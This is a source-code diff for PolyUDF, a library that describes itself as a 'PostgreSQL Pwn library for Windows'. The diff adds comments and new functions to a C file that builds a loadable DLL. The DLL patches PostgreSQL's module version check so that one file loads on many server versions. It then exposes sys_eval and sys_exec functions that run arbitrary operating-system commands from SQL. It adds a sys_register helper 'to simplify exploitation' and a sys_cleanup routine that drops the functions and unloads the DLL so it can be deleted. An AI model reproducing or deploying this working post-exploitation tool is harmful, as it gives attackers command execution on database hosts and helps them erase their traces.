@@ -4,7 +4,7 @@ main.c - This file is part of PolyUDF project.
 PolyUDF - PostgreSQL Pwn library for Windows with multiversion support. One DLL to rule them all!
 Copyright (C) 2020-2020  PuneyK - Republic of Pwning (RoP) Team
 web: https://blog.rop.la/
-email: puneyk@rop.la / tools@rop.la
+email: puneyk@rop.la / team@rop.la
 
 This library is free software; you can redistribute it and/or
 modify it under the terms of the GNU Lesser General Public
@@ -27,6 +27,10 @@ Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 #include <winver.h>
 #include "utils/geo_decls.h"
 
+/* PG_MODULE_MAGIC_DATA
+ This is our custom and managed Structured that is validated by the postgres process.
+ This Structure is dynamicaly patched to satisfy the version and parameters requirements for each version
+*/
 Pg_magic_struct Pg_magic_data = {
 	sizeof(Pg_magic_struct),
 	0,
@@ -35,8 +39,11 @@ Pg_magic_struct Pg_magic_data = {
 	NAMEDATALEN,
 	FLOAT4PASSBYVAL,
 	FLOAT8PASSBYVAL
-};//PG_MODULE_MAGIC_DATA;
+};
 
+/*
+This function is called by the postgres process to retrieve the PG_MODULE_MAGIC_DATA structure of the module
+*/
 extern PGDLLEXPORT const Pg_magic_struct *PG_MAGIC_FUNCTION_NAME(void);
 const Pg_magic_struct * PG_MAGIC_FUNCTION_NAME(void) \
 {
@@ -84,13 +91,21 @@ void NTAPI TlsCallBack(PVOID h, DWORD dwReason, PVOID pv);
 HANDLE hLibModule = NULL;
 
 /*
+First TLS CallBack. This function is called before the DLL Entry Point.
+Here we do the dynamic PostgreSQL version detection and PG_MODULE_MAGIC_DATA
+patching.
+
+@hModule DLL module handle
+@dwReason loading/unloading event
+@pv
+
 */
 void NTAPI TlsCallBack(PVOID hModule, DWORD dwReason, PVOID pv)
 {
 	elog(NOTICE, "TlsCallBack: dwReason: %d", dwReason);
 
 	if (dwReason != DLL_PROCESS_ATTACH) {
-		elog(NOTICE, "TlsCallBack: dwReason != DLL_PROCESS_ATTACH");
+		elog(NOTICE, "TlsCallBack: dwReason != DLL_PROCESS_ATTACH. Leaving.");
 		return;
 	}
 
@@ -99,11 +114,18 @@ void NTAPI TlsCallBack(PVOID hModule, DWORD dwReason, PVOID pv)
 	char* version = NULL;
 	int major = 0, minor = 0;
 
+	// Save Module Handler for sys_cleanup usage
 	hLibModule = hModule;
 
+	// Find postgres.exe process on memory and get file path
 	HANDLE hPostgres = GetModuleHandleA((LPCSTR)"postgres.exe");
+	if (hPostgres == NULL) {
+		elog(NOTICE, "[!] Cannot find postgres process on memory!\n");
+		return;
+	}
 	GetModuleFileNameA(hPostgres, ModulePath, MAX_PATH);
 
+	// Get File Version Information for Patching PG_MODULE_MAGIC_DATA
 	DWORD  verHandle = 0;
 	UINT   size = 0;
 	LPBYTE lpBuffer = NULL;
@@ -160,10 +182,10 @@ void NTAPI TlsCallBack(PVOID hModule, DWORD dwReason, PVOID pv)
 	return;
 }
 
-/*
- Reference: https://github.com/postgres/postgres/blob/master/src/backend/utils/adt/varlena.c
- */
 
+/*
+Function to quote a string
+*/
 char *quoted_string(const char * cstr) {
 	char	*quoted_string;
 	size_t	cstr_len = strlen(cstr);
@@ -183,6 +205,9 @@ char *quoted_string(const char * cstr) {
 	return  quoted_string;
 }
 
+/*
+Utility function to open a process
+*/
 FILE *compat_popen(const char *cmd, const char *type)
 {
 	char	*quoted_cmd;
@@ -202,6 +227,9 @@ FILE *compat_popen(const char *cmd, const char *type)
 	return resproc;
 }
 
+/*
+Function to execute a command and return exit code
+*/
 int compat_system(const char *cmd)
 {
 	char	*quoted_cmd;
@@ -223,51 +251,73 @@ int compat_system(const char *cmd)
 }
 
 
+/*
+text_to_cstring and cstring_to_text
+Reference: https://github.com/postgres/postgres/blob/master/src/backend/utils/adt/varlena.c
+*/
 
+
+/*
+UDF that executes the given command and returns the STDOUT.
+
+@commad shell command to execute
+*/
 PGDLLEXPORT Datum sys_eval(PG_FUNCTION_ARGS);
 PG_FUNCTION_INFO_V1(sys_eval);
 Datum sys_eval(PG_FUNCTION_ARGS) {
 	text *argv0 = PG_GETARG_TEXT_P(0);
 	text *result_text;
+
 	char *command;
-	char *result;
 	FILE *pipe;
-	char *line;
-	int32 outlen, linelen;
+	
+	char *stdout_line;
+	char *stdout_buffer;
+
+	int32 stdout_len, stdout_linelen;
 
 	command = (char *)text_to_cstring(argv0);
 
 	elog(NOTICE, "[sys_eval] Command: %s", command);
 
-	line = (char *)malloc(1024);
-	result = (char *)malloc(1);
-	outlen = 0;
+	stdout_line = (char *)malloc(1024);
+	stdout_buffer = (char *)malloc(1);
+	stdout_len = 0;
 
-	result[0] = '\0';
+	stdout_buffer[0] = '\0';
 
 	pipe = compat_popen(command, "r");
 
-	while (fgets(line, sizeof(line), pipe) != NULL) {
-		linelen = strlen(line);
-		result = (char *)realloc(result, outlen + linelen);
-		strncpy(result + outlen, line, linelen);
-		outlen = outlen + linelen;
+	while (fgets(stdout_line, sizeof(stdout_line), pipe) != NULL) {
+		// Get stdout line length
+		stdout_linelen = strlen(stdout_line);
+		// Increase stdout buffer to alloc space for new line
+		stdout_buffer = (char *)realloc(stdout_buffer, stdout_len + stdout_linelen);
+		// Copy new line content to sdtout buffer
+		strncpy(stdout_buffer + stdout_len, stdout_line, stdout_linelen);
+		// Increase stdout length
+		stdout_len = stdout_len + stdout_linelen;
 	}
 
 	pclose(pipe);
 	pfree(command);
 
-	if (*result) {
-		result[outlen - 1] = 0x00;
+	if (*stdout_buffer) {
+		stdout_buffer[stdout_len - 1] = '\0';
 	}
 
-	result_text = (text *)cstring_to_text(result);
+	result_text = (text *)cstring_to_text(stdout_buffer);
 
 	PG_FREE_IF_COPY(argv0, 0);
 	PG_RETURN_POINTER(result_text);
 }
 
 
+/*
+UDF that executes the given command and returns the exit code of the command.
+
+@commad shell command to execute
+*/
 PGDLLEXPORT Datum sys_exec(PG_FUNCTION_ARGS);
 PG_FUNCTION_INFO_V1(sys_exec);
 Datum sys_exec(PG_FUNCTION_ARGS) {
@@ -287,8 +337,6 @@ Datum sys_exec(PG_FUNCTION_ARGS) {
 	PG_RETURN_INT32(result);
 }
 
-
-DWORD WINAPI CleanUp(LPVOID lpParam);
 
 /*
 SPI Constants
@@ -321,15 +369,74 @@ Source: https://docs.huihoo.com/doxygen/postgresql/spi_8h_source.html#l00044
 #define SPI_OK_UPDATE_RETURNING 13
 #define SPI_OK_REWRITTEN        14
 
+
+/*
+UDF that use SPI to register all the UDFs in this DLL. This simplify explotation and post explotation cleanup.
+Note: In case one or all functions are already registered it will replace them without throwing an error.
+
+See: sys_cleanup(bool)
+*/
+PGDLLEXPORT Datum sys_register(PG_FUNCTION_ARGS);
+PG_FUNCTION_INFO_V1(sys_register);
+Datum sys_register(PG_FUNCTION_ARGS) {
+	char ModulePath[MAX_PATH] = { 0 };
+	int result;
+	result = 0;
+	char *regcmd = NULL;
+	int msize = GetModuleFileNameA(hLibModule, ModulePath, MAX_PATH);
+
+	if (msize == 0) {
+		PG_RETURN_INT32(result);
+	}
+
+	if (SPI_connect() == SPI_OK_CONNECT) {
+		int ret;
+		elog(NOTICE, "[sys_register] DLL Path '%s'", ModulePath);
+		regcmd = (char *)malloc(1024);
+
+		sprintf(regcmd, "CREATE OR REPLACE FUNCTION sys_cleanup(bool) RETURNS int4 AS '%s','sys_cleanup' LANGUAGE c VOLATILE STRICT COST 1", ModulePath);
+		elog(NOTICE, "[sys_register] Command:\n%s", regcmd);
+		ret = SPI_exec(regcmd, 0);
+
+		sprintf(regcmd, "CREATE OR REPLACE FUNCTION sys_eval(text) RETURNS text AS '%s', 'sys_eval' LANGUAGE c VOLATILE STRICT COST 1", ModulePath);
+		elog(NOTICE, "[sys_register] Command:\n%s", regcmd);
+		ret = SPI_exec(regcmd, 0);
+
+		sprintf(regcmd, "CREATE OR REPLACE FUNCTION sys_exec(text) RETURNS int4 AS '%s', 'sys_exec' LANGUAGE c VOLATILE STRICT COST 1", ModulePath);
+		elog(NOTICE, "[sys_register] Command:\n%s", regcmd);
+		ret = SPI_exec(regcmd, 0);
+
+		free(regcmd);
+
+		SPI_finish();
+		result = 1;
+	}
+	PG_RETURN_INT32(result);
+}
+
+
+DWORD WINAPI CleanUp(LPVOID lpParam);
+
+/*
+UDF that use SPI to unload DLL module for allowing deleting it from disk. It will also drop all the UDFs in the DLL if @dropFn is true.
+
+@dropFn flag to enable UDFs unregistering.
+*/
 PGDLLEXPORT Datum sys_cleanup(PG_FUNCTION_ARGS);
 PG_FUNCTION_INFO_V1(sys_cleanup);
 Datum sys_cleanup(PG_FUNCTION_ARGS) {
 	int result;
 	result = 0;
+	bool dropFn = PG_GETARG_BOOL(0);
 
 	// Reference: https://www.postgresql.org/docs/9.0/spi-examples.html
-	if (SPI_connect() == SPI_OK_CONNECT) {
+	if (dropFn && SPI_connect() == SPI_OK_CONNECT) {
 		int ret;
+
+		elog(NOTICE, "[sys_cleanup] Going to DROP sys_register");
+		ret = SPI_exec((LPCSTR)"drop function sys_register()", 0);
+		elog(NOTICE, "[sys_cleanup] SPI_exec returnet %d", ret);
+
 		elog(NOTICE, "[sys_cleanup] Going to DROP sys_eval");
 		ret = SPI_exec((LPCSTR)"drop function sys_eval(text)", 0);
 		elog(NOTICE, "[sys_cleanup] SPI_exec returnet %d", ret);
@@ -339,7 +446,7 @@ Datum sys_cleanup(PG_FUNCTION_ARGS) {
 		elog(NOTICE, "[sys_cleanup] SPI_exec returnet %d", ret);
 
 		elog(NOTICE, "[sys_cleanup] Going to DROP sys_cleanup");
-		ret = SPI_exec((LPCSTR)"drop function sys_cleanup()", 0);
+		ret = SPI_exec((LPCSTR)"drop function sys_cleanup(bool)", 0);
 		elog(NOTICE, "[sys_cleanup] SPI_exec returnet %d", ret);
 		SPI_finish();
 		result = 1;
@@ -357,6 +464,9 @@ Datum sys_cleanup(PG_FUNCTION_ARGS) {
 	PG_RETURN_INT32(result);
 }
 
+/*
+Thread used to execute Module Unloading. It uses FreeLibraryAndExitThread to safely execute code from the DLL to be unloaded
+*/
 DWORD WINAPI CleanUp(LPVOID lpParam)
 {
 	elog(NOTICE, "[CleanUp] Thread Start and sleep");
